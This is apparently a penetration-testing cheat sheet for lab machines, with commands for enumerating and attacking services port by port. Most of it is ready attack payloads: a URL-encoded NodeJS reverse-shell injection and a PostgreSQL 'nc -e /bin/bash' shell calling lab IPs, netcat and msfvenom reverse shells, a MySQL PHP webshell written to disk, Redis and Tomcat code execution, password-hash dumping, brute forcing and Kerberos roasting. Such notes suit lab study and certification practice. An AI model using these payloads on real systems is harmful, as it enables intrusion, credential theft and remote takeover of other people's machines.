# Machines

## Recon & Enum

### The basic

Data and information gathering.

### [nmap](https://nmap.org/book/man.html)

1. Host scan

```
nmap -p 1-65535 -v -A -Pn [IP_ADDR]
nmap -sC -sV -A -p- -v [IP_ADDR]
nc -nvv -w 1 -z [IP_ADDR] 3388-3390
nc -vv -z [IP_ADDR] 1-65535 2>&1 | grep "succeeded" > scan.out
nmap --script vuln [IP_ADDR]
proxychains nmap --top-ports=20 -sT -Pn [IP_ADDR]
```

### Commonly seen port (Default port num)

#### FTP (21)

```shell
ftp [IP_ADDR]
anonymous sign in
put [FILE]    # Try for file upload
wget --no-passive-ftp ftp://[USERNAME]:[PASSWORD]@[IP_ADDR]/[FILE]
```

#### SSH (22)

```shell
ssh [USERNAME]@[IP_ADDR] [PORT]
ssh -o KexAlgorithms=diffie-hellman-group1-sha1 -oHostKeyAlgorithms=+ssh-rsa -o Ciphers=aes256-cbc [IP_ADDR]
ssh [USERNAME]@[IP_ADDR] -i id_rsa    # chmod 600 id_rsa
ssh -i id_rsa [USERNAME]@[IP_ADDR] -L [LOCAL_PORT]:localhost:[REMOTE_PORT]   # ssh port forwarding  
scp -O -P [PORT] [FILE_TO_TRANSFER] [USERNAME]@[IP_ADDR]:[DESTINATION_FILE]    # copy file from local to remote through scp

ssh2john.py id_rsa > hash   # encrypted id_rsa
john hash --wordlist=/opt/wordlists/rockyou.txt

ssh-keygen
# upload id_rsa.pub content to authorized_keys in remote machine for ssh access
```

#### SMTP (25)

```
HELO - 
EHLO - Extended SMTP.
STARTTLS - SMTP communicted over unencrypted protocol. By starting TLS-session we encrypt the traffic.
RCPT - Address of the recipient.
DATA - Starts the transfer of the message contents.
RSET - Used to abort the current email transaction.
MAIL - Specifies the email address of the sender.
QUIT - Closes the connection.
HELP - Asks for the help screen.
AUTH - Used to authenticate the client to the server.
VRFY - Asks the server to verify is the email user's mailbox exists.
```

Source: https://d00mfist.gitbooks.io/ctf/content/list\_of\_common\_ports.html

#### DNS (53)

```shell
nmap --script=dns-zone-transfer -p 53 [IP_ADDR]
dig axfr [DOMAIN].[TLD] @[IP_ADDR]
dig @[IP_ADDR] -x [IP_ADDR]
nslookup [IP_ADDR]
> server
> 127.0.0.1
> 127.0.0.2
> [IP_ADDR]
```

#### HTTP (80) / HTTPS (443)

```shell
gobuster dir -u [URL] -w [WORDLIST] -b "400,404"    # web enumeration, note: windows web server are case insensitive
ffuf -u http://[IP_ADDR]/ -H "Host: FUZZ.[DOMAIN]" -w /seclists/Discovery/DNS/shubs-subdomains.txt -t 100 -fl 10
nikto -h [URL]
davtest -url [URL]    # PUT method test
cadaver [IP_ADDR]    # for authenticated webdav with credentials
cewl [URL]    # get possible password from site
wpscan --url    # or manually browse to /wp-content/plugins/ if no plugins found
aws --endpoint=http://s3.thetoppers.htb s3 ls s3://thetoppers.htb   # aws s3 bucket list
aws --endpoint=http://s3.thetoppers.htb s3 cp shell.php s3://thetoppers.htb   # upload file
hydra [IP_ADDR] http-form-post "/form/frontpage.php:user=admin&pass=^PASS^:INVALID LOGIN" -l admin -P /usr/share/wordlists/rockyou.txt -vV -f
openssl s_client -connect [IP_ADDR]:443


----NodeJS function injection----
(function(){var+net+%3d+require("net"),cp%3drequire("child_process"),sh%3dcp.spawn("/bin/sh",+[])%3bvar+client+%3d+new+net.Socket()%3b+client.connect(21,+"192.168.49.77",+function(){client.pipe(sh.stdin)%3bsh.stdout.pipe(client)%3bsh.stderr.pipe(client)%3b})%3breturn+/a/%3b})()%3b
```

#### Kerberos (88)

```shell
kerbrute userenum --dc [DOMAIN] -d [DOMAIN] [WORDLIST]    # enum user
GetNPUsers.py [DOMAIN]/[USERNAME] -request -no-pass -dc-ip [IP_ADDR]    # get user that does not require kerberos preauth
secretsdump.py -dc-ip [IP_ADDR] [DOMAIN].local/[USERNAME]:[PASSWORD]@[IP_ADDR]    # retrieve all of the password hashes
```

Ref: https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetNPUsers.py

#### SNMP (161 UDP)

```shell
snmpwalk -v 2c [IP_ADDR] -c public > [OUTFILE]
snmp-check [IP_ADDR]
```

#### POP3 (110 & 995)

```shell
telnet [IP_ADDR] [PORT]
USER [USERNAME]
PASS [PASSWORD]
list    # get list of email
retr [#]    # no. of email to read
quit
```

#### Network File System (111 & 2049)

```shell
showmount -e [IP_ADDR]
mount -o nolock [IP_ADDR]:/home ~/home/
mount -t nfs [IP_ADDR]:/[Remote_Folder] [Local_Folder]/
mount -t nfs -o vers=3 [IP_ADDR]:/[Remote_Folder] [Local_Folder]/

-------Imitating uuid 1014-------
adduser pwn
sed -i -e 's/1001/1014/g' /etc/passwd
cat /etc/passwd | grep pwn
su pwn
```

#### LDAP (389 & 636)

```shell
ldapsearch -H ldap://[IP_ADDR] -x
ldapsearch -H ldap://[IP_ADDR] -x -s base namingcontexts
ldapsearch -H ldap://[IP_ADDR] -x -b "DC=htb,DC=local"
ldapsearch -H ldap://[IP_ADDR] -x -b "DC=htb,DC=local" '(objectClass=Person)'
ldapsearch -H ldap://[IP_ADDR] -x -b "DC=htb,DC=local" '(objectClass=Person)' sAMAccountName |grep sAMAccountName
ldapsearch -H ldap://10.10.10.182 -x -b "DC=cascade,DC=local" '(name=[group_name])'
ldapsearch -H ldap://10.10.11.174 -D 'support\[USERNAME]' -w '[PASSWORD]' -b "DC=support,DC=htb" '(objectClass=Person)'
ldapsearch -v -x -D fmcsorley@hutch.offsec -w [password] -b "DC=hutch,DC=offsec" -H ldap://192.168.132.122 "(ms-MCS-AdmPwd=*)" ms-MCS-AdmPwd
GetNPUsers.py [domain_name]/[Username(optional)]:[Password(optional)] -dc-ip [IP_ADDR] -request     # Eg: GetNPUsers.py scrm.local/ -dc-ip 10.10.11.168 -request
GetNPUsers.py htb.local/ -dc-ip 10.10.10.161 -request -no-pass -userfiles username.txt
```

#### SMB (445)

```shell
smbclient -L [IP_ADDR]    # To list out available directories
smbclient \\\\[IP_ADDR]\\[DIRECTORY]    # To show directory content
smbclient \\\\[IP_ADDR]\\[DIRECTORY] -U [DOMAIN]/[USERNAME]    # Sign in with username
smbmap -H [IP_ADDR] -u [USERNAME]
smbmap -R [SHARE] -H [IP_ADDR]
lookupsid.py anonymous@$[IP_ADDR]   # with IPC$ readonly permission
secretsdump.py [DOMAIN]/[USERNAME]:[PASSWORD]@[IP_ADDR]   # with ADMIN$ write permission
psexec.py -dc-ip [IP_ADDR] active.htb/administrator:[PASSWORD]@[IP_ADDR] cmd  # admin privilege; with ADMIN$ write permission
crackmapexec smb [IP_ADDR] --shares
crackmapexec smb [IP_ADDR] -d [domain] -u [USERNAME] -p [PASSWORD] --shares   # can be use for bruteforcing too
enum4linux -a [IP_ADDR]
gpp-decrypt "[cpassword]"   # with sysvol groups.xml readable
```

MS17-010 EternalBlue exploitation for SMBv1 in Windows Vista, 7, 8.1, 10; Server 2008, 2012, 2016 SMB share folder mounting

```shell
mkdir /mnt/[FOLDER_NAME]
mount -t cifs -o username=[USERNAME] //[IP_ADDR]/[SHARED_PATH] /mnt/[FOLDER_NAME]
```

Mounting VHD file Ref: https://www.how2shout.com/linux/mount-virtual-hard-disk-vhd-file-ubuntu-linux/

#### Rsync (873)

```shell
rsync -rdt rsync://[IP_ADDR]
rsync -av [MODULE]@[IP_ADDR]::[MODULE]/ .   # Download
rsync -avp [LOCAL DIRECTORY] [MODULE]@[IP_ADDR]::[REMOTE DIRECTORY]/    # Upload
```

#### Oracle (1521)

```
sqlplus [USERNAME]/[PASSWORD]@[IP_ADDR]/[SID]
sqlplus [USERNAME]/[PASSWORD]@[IP_ADDR]/[SID] as sysdba
---------------------------------
select * from user_role_privs;

```

#### Microsoft SQL (1433)

```shell
impacket-mssqlclient [DOMAIN]/[USERNAME]@[IP_ADDR] -windows-auth    # Connect to mssql server
SELECT IS_SRVROLEMEMBER('sysadmin')   # Check for sysadmin privileage; return 1 for true, 0 for false
SELECT name FROM master.dbo.sysdatabases    # Retrieve list of databases
EXEC master..xp_cmdshell '[CMD]'    # Execute remote command with sysadmin privileage
# to enable xp_cmdshell: https://learn.microsoft.com/en-us/sql/database-engine/configure-windows/xp-cmdshell-server-configuration-option?view=sql-server-ver16
----------------------------------
USE [db];
SELECT name FROM sys.tables;
SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES;
```

#### MySQL (3306)

```shell
mysql -u [USERNAME] -h [IP_ADDR] -p   # Connect to mysql server
mysql -u [USERNAME] -h [IP_ADDR] -p -e 'SHOW DATABASES;'
mysql -u [USERNAME] -h [IP_ADDR] -p -e 'USE [DATABASE]; SHOW TABLES;'
select "<?php echo shell_exec($_GET['cmd']);?>" into outfile 'C:/xampp/htdocs/shell.php';
-------------- UDF ----------------
Requirement (root mysql credential, MySQL 4.1.10a and MySQL 4.0.24)
https://www.exploit-db.com/exploits/1518
```

#### RDP (3389)

```shell
rdesktop -u -r clipboard:CLIPBOARD [USERNAME] [IP_ADDR]:[PORT]
xfreerdp /v:[IP_ADDR] /u:[USERNAME] /p:[PASSWORD] /cert:ignore +clipboard /dynamic-resolution /drive:share,/tmp
. \\tsclient\share\   # in powershell to access the files in /tmp
```

#### Postgresql (5432)

```shell
psql -U [USERNAME] -p [PORT] -h [HOST]    # default postgres:postgres
\l    # list databases
select pg_ls_dir('/home/');
select pg_read_file('/etc/passwd');
-------------RCE
postgres=# DROP TABLE IF EXISTS cmd_exec;
DROP TABLE
postgres=# CREATE TABLE cmd_exec(cmd_output text);
CREATE TABLE
postgres=# COPY cmd_exec FROM PROGRAM 'id';
COPY 1
postgres=# SELECT * FROM cmd_exec;
                               cmd_output                               
------------------------------------------------------------------------
 uid=106(postgres) gid=113(postgres) groups=113(postgres),112(ssl-cert)
(1 row)

postgres=# COPY cmd_exec FROM PROGRAM 'nc 192.168.49.52 80 -e /bin/bash';
```

#### Redis (6379)

```shell
redis-cli -h [IP]   # without auth
redis-cli -h [IP] -a [PASSWORD]   # auth required
----------
info
keys *
type [KEYS]
get [KEYS]    # strings
lrange [KEYS] [1] [64]    # list
----------
# Upload shell to a path with write access then read with LFI
# to check which path has write access to:
/etc/redis/redis.conf
/usr/lib/systemd/system/redis-server.service
# to upload: https://book.hacktricks.xyz/network-services-pentesting/6379-pentesting-redis

----------
# If able to upload file to the system (doesnt matter through http upload or ftp)
# https://github.com/n0b0dyCN/RedisModules-ExecuteCommand
# Compile a module and upload it 
MODULE LOAD /[DIRECTORY]/[TO]/[MODULE].so 
system.rev [ATTACKER_IP] [PORT]
```

#### Apache Tomcat (8080)

```shell
Default page:
/admin
/manager
/manager/html
Exploit script manager:
curl -u 'tomcat:[PASSWORD]' http://[IP_ADDR]:8080/manager/text/deploy?path=/[PATH] -T rev.war
```

#### SPLUNK (8089)

```
Default Credential 
admin:changeme
```

#### MongoDB (27017)

```
mongo
show dbs
use [DATABASE]
show collections
db.[COLLECTIONS].find()
```

## Working with MSFVENOM and MSFCONSOLE

```shell
msfvenom -p windows/meterpreter/reverse_tcp LHOST=[MY_IP_ADDR] LPORT=4444 -f [asp/aspx/php/filetype] > [OUTPUT_FILE.asp/aspx/php/filetype]
msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.49.134 LPORT=4242 -f elf > reverse.elf
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.49.74 LPORT=21 -f msi> evil.msi
msfvenom -p windows/x64/shell/reverse_tcp lhost=192.168.119.219 lport=8888 -f exe -a x64 > vuln64.exe

----------------------------------
msfconsole:
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp   # payload match with the one used in venom
run     # start listener

----------------------------------
meterpreter session:
getuid     # get current user session
sysinfo    # get information of the remote system
background / ctrl+z
use post/multi/recon/local_exploit_suggester    # set session number
```

### Cisco router password cracker

https://github.com/axcheron/cisco\_pwdecrypt\
https://www.ifm.net.nz/cookbooks/cisco-ios-enable-secret-password-cracker.html

### Netcat

Listener (on attacker machine) and reverse shell command

```
nc -lnvp [PORT]
nc [IP_ADDR] [PORT] -e /bin/sh    # reverse shell
l = listen; n = ip addresses only, no DNS lookup; v = verbose; p = local port
```

### John

```
john [hash_file] --format=Raw-SHA1 --wordlist=/usr/share/wordlists/rockyou.txt
```

### Hashcat

```
hashcat -a 3 -m 0 [HASH_FILE] /usr/share/wordlists/rockyou.txt    # -a 3 bruteforce attack; -m 0 MD5 mode
```

Ref: https://hashcat.net/wiki/doku.php?id=example\_hashes

### Python

```python
python3 'import pty;pty.spawn("/bin/bash");'
```

### Port Knocking

```
systemctl start knockd
knock [IP_ADDR] [PORT1] [PORT2] [PORT3] -d [DELAY MILLISEC]
```

### Docker

```
cat /proc/net/arp
```

### Pivoting

```
nc -vv -z 10.1.1.1 1-65535 2>&1 | grep "succeeded"
ssh -N -D 127.0.0.1:9999 sean@10.11.1.251
---------Chisel---------
Reverse proxy:
On kali: 
./chisel server -p 9999 --reverse &
On victim/windows:
chisel.exe client [KALI_IP]:9999 R:socks &

Forward proxy:
On kali: 
./chisel client [VICTIM_IP]:8080 9999:socks
On victim/windows:
chisel.exe server -p 8080 --socks5
#   https://tryhackme.com/room/wreath
```

## Checklist

:white\_check\_mark: port scan\
:white\_check\_mark: password reuse\
:white\_check\_mark: check version for vulnerabilities and exploit\\
